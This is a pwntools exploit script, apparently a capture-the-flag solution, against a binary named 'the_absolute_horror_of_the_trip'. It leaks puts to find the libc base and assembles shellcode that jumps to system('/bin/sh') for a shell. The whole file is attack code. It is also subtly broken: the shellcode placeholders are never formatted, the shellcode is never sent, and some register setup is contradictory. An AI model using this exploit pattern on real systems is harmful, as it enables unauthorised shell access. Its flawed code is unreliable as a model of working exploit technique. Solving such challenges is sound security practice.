#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './the_absolute_horror_of_the_trip_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    puts = io.recvuntil(b'0x')
    puts = int(io.recvline().strip(), 16)
    libc.address = puts - libc.sym['puts']
    system_off = libc.sym['system'] - libc.address
    
    shellcode = asm('''
        mov rax, 0x1337131000
        mov rdi, qword [r10]
        shr rdi, 32
        shl rdi, 32
        or r12, {hex(libc.address)}
        lea rdi, s[rip]
        add r12, {hex(system_off)}

        mov rsp, r13
        mov rbp, r13

        jmp r12

        s:
            .string "/bin/sh"
    ''')
    
    success(f"libc base: {hex(libc.address)}")
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()